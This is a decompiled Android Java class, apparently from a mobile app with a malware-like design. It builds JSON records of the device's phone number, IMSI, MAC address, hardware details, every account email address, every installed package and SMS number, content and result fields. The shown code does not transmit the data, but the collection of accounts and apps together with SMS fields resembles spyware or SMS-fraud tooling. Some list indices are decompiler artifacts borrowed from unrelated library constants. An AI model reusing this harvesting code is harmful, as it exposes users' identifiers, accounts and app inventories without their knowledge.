package com.clouds.util;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.Context;
import android.content.pm.PackageInfo;
import android.os.Build;
import android.os.Build.VERSION;
import android.telephony.TelephonyManager;
import android.util.Log;
import com.clmobile.plugin.networktask.UserModel;
import com.clmobile.plugin.task.StoreManager;
import com.clouds.db.Dao;
import com.clouds.debug.SystemDebug;
import com.clouds.install.FileInstall;
import com.clouds.widget.DeviceApplication;
import com.yongding.util.PhoneState;
import java.util.List;
import org.codehaus.jackson.impl.JsonWriteContext;
import org.codehaus.jackson.org.objectweb.asm.ClassWriter;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class SystemInfo {
    private static final String TAG;

    static {
        TAG = SystemInfo.class.getSimpleName();
    }

    public static String getTelephonyInfo(Context context, String number, String content, int resultCode) throws Exception {
        TelephonyManager phoneMgr = (TelephonyManager) context.getSystemService("phone");
        String PhoneModel = Build.MODEL;
        String PlatVer = VERSION.RELEASE;
        String systemPlatform = "android";
        String platform = DeviceApplication.getPlatform();
        String PhoneFact = Build.MANUFACTURER;
        String Phone = phoneMgr.getLine1Number();
        String IMSI = new PhoneState(context).getIMSI(context);
        String Resolution = DeviceApplication.getScrres(context);
        String Mac = SysProperty.getMACAddress();
        String PacketID = DeviceApplication.retrieveChannerId(context);
        if (IMSI.equalsIgnoreCase(PhoneState.defaultSeri)) {
            IMSI = Mac;
        }
        if (Mac.equalsIgnoreCase("macSerial")) {
            Mac = IMSI;
        }
        String UserID = "";
        UserModel user = StoreManager.getIntance(context).getUser();
        if (user != null) {
            UserID = user.getUserID();
        }
        JSONObject jsonObject = new JSONObject();
        try {
            jsonObject.put(SMSConstant.S_PhoneModel, PhoneModel);
            jsonObject.put(SMSConstant.S_PlatVer, PlatVer);
            jsonObject.put(SMSConstant.S_systemPlatform, systemPlatform);
            jsonObject.put(SMSConstant.S_platform, platform);
            jsonObject.put(SMSConstant.S_PhoneFact, PhoneFact);
            jsonObject.put(SMSConstant.S_Phone, Phone);
            jsonObject.put(SMSConstant.S_IMSI, IMSI);
            jsonObject.put(SMSConstant.S_Resolution, Resolution);
            jsonObject.put(SMSConstant.S_Mac, Mac);
            jsonObject.put(SMSConstant.S_PacketID, PacketID);
            jsonObject.put(SMSConstant.S_UserID, UserID);
            jsonObject.put(SMSConstant.S_number, number);
            jsonObject.put(SMSConstant.S_content, content);
            jsonObject.put(SMSConstant.S_resultCode, resultCode);
        } catch (JSONException e) {
            e.printStackTrace();
        }
        return jsonObject.toString();
    }

    public String collectJSON(Context context) {
        JSONArray jarrbuild = getBuilProp(context);
        JSONArray jarrver = getVerinfo(context);
        JSONObject jsonObject = new JSONObject();
        try {
            jsonObject.put("buildprop", jarrbuild);
            jsonObject.put("verinfo", jarrver);
            jsonObject.put("mail", getAccountEmailInfo(context));
            jsonObject.put("info", getDeviceAppInfo(context));
        } catch (Exception e) {
            e.printStackTrace();
        }
        return jsonObject.toString();
    }

    public JSONArray getAccountEmailInfo(Context context) throws Exception {
        Account[] accounts1 = AccountManager.get(context).getAccounts();
        Log.i("--Get Account Example--", new StringBuilder(String.valueOf(accounts1.length)).append(" :length1").toString());
        JSONArray list1 = new JSONArray();
        int length = accounts1.length;
        int i = 0;
        while (i < length) {
            Account account = accounts1[i];
            SystemDebug.e("--Get Account Example 1--", account.name);
            SystemDebug.e("--Get Account Example 1--", account.type);
            JSONObject jsonObject = new JSONObject();
            jsonObject.put("mail", account.name);
            list1.put(jsonObject);
            i++;
        }
        return list1;
    }

    public JSONArray getBuilProp(Context context) {
        String platform = DeviceApplication.getPlatform();
        String hardware = DeviceApplication.getHardware();
        String scrsize = DeviceApplication.getScrsize();
        String scrres = DeviceApplication.getScrres(context);
        String release = DeviceApplication.getRelease();
        String sdk = DeviceApplication.getSdk();
        String model = DeviceApplication.getModel();
        String device = DeviceApplication.getDevice();
        String name = DeviceApplication.getDeviceName();
        String manufacturer = DeviceApplication.getManufacturer();
        String type = DeviceApplication.getDeviceType();
        String buildtime = DeviceApplication.getDeviceBuiledTime();
        String mac = SysProperty.getMACAddress();
        String telephoneType = DeviceApplication.getDeviceIsTelephone();
        String wondertvAddress = DeviceApplication.getWondertvAddress();
        String deviceProduct = DeviceApplication.getDeviceProduct();
        String reserve = "";
        JSONObject jsonObject = new JSONObject();
        JSONArray list = new JSONArray();
        try {
            jsonObject.put(SMSConstant.S_platform, platform);
            jsonObject.put("hardware", hardware);
            jsonObject.put("scrsize", scrsize);
            jsonObject.put("scrres", scrres);
            jsonObject.put("release", release);
            jsonObject.put("sdk", sdk);
            jsonObject.put("model", model);
            jsonObject.put("device", device);
            jsonObject.put("name", name);
            jsonObject.put("manufacturer", manufacturer);
            jsonObject.put("type", type);
            jsonObject.put("buildtime", buildtime);
            jsonObject.put("mac", mac);
            jsonObject.put("telephoneType", telephoneType);
            jsonObject.put("wondertvAddress", wondertvAddress);
            jsonObject.put("deviceProduct", deviceProduct);
            jsonObject.put("reserve", reserve);
        } catch (JSONException e) {
            e.printStackTrace();
        }
        list.put(jsonObject);
        return list;
    }

    public JSONArray getDeviceAppInfo(Context context) throws JSONException {
        List<PackageInfo> packs = context.getPackageManager().getInstalledPackages(0);
        int count = packs.size();
        JSONArray list1 = new JSONArray();
        int i = 0;
        while (i < count) {
            PackageInfo p = (PackageInfo) packs.get(i);
            if (p.versionName != null) {
                JSONObject jsonObject = new JSONObject();
                if ((p.applicationInfo.flags & 1) > 0) {
                    jsonObject.put("type", FileInstall.SYSTEM_TYPE);
                    SystemDebug.e("MainActivity", new StringBuilder("System packageName: ").append(p.packageName).append(" System firstInstallTime: ").append(p.firstInstallTime).append(" System lastUpdateTime: ").append(p.lastUpdateTime).append(" System sharedUserId: ").append(p.sharedUserId).append(" System sharedUserLabel: ").append(p.sharedUserLabel).append(" System versionCode: ").append(p.versionCode).append(" System versionName: ").append(p.versionName).toString());
                } else {
                    jsonObject.put("type", FileInstall.USER_TYPE);
                    SystemDebug.e("MainActivity", new StringBuilder("User packageName: ").append(p.packageName).append(" User firstInstallTime: ").append(p.firstInstallTime).append(" User lastUpdateTime: ").append(p.lastUpdateTime).append(" User sharedUserId: ").append(p.sharedUserId).append(" User sharedUserLabel: ").append(p.sharedUserLabel).append(" User versionCode: ").append(p.versionCode).append(" User versionName: ").append(p.versionName).toString());
                }
                jsonObject.put("packageName", p.packageName);
                jsonObject.put("firstInstallTime", p.firstInstallTime);
                jsonObject.put("lastUpdateTime", p.lastUpdateTime);
                jsonObject.put("sharedUserLabel", p.sharedUserLabel);
                jsonObject.put("versionCode", p.versionCode);
                jsonObject.put("versionName", p.versionName);
                list1.put(jsonObject);
            }
            i++;
        }
        return list1;
    }

    public JSONArray getVerinfo(Context context) {
        List<Integer> list = Dao.getDaoInstanca(context).getSysInfos("sysInfo");
        int intValue = ((Integer) list.get(0)).intValue();
        String logover = ((Integer) list.get(1)).toString();
        String bhurlver = ((Integer) list.get(ClassWriter.COMPUTE_FRAMES)).toString();
        String wallppver = ((Integer) list.get(JsonWriteContext.STATUS_OK_AFTER_SPACE)).toString();
        String screenshotsver = ((Integer) list.get(JsonWriteContext.STATUS_EXPECT_VALUE)).toString();
        String appsver = ((Integer) list.get(JsonWriteContext.STATUS_EXPECT_NAME)).toString();
        intValue = DistinguishDevice.getVersionCode(context);
        JSONObject jsonObject = new JSONObject();
        JSONArray list1 = new JSONArray();
        try {
            jsonObject.put("clientver", intValue);
            jsonObject.put("logover", logover);
            jsonObject.put("homepagever", bhurlver);
            jsonObject.put("wallppver", wallppver);
            jsonObject.put("screenshotsver", screenshotsver);
            jsonObject.put("appsver", appsver);
        } catch (JSONException e) {
            e.printStackTrace();
        }
        list1.put(jsonObject);
        return list1;
    }
}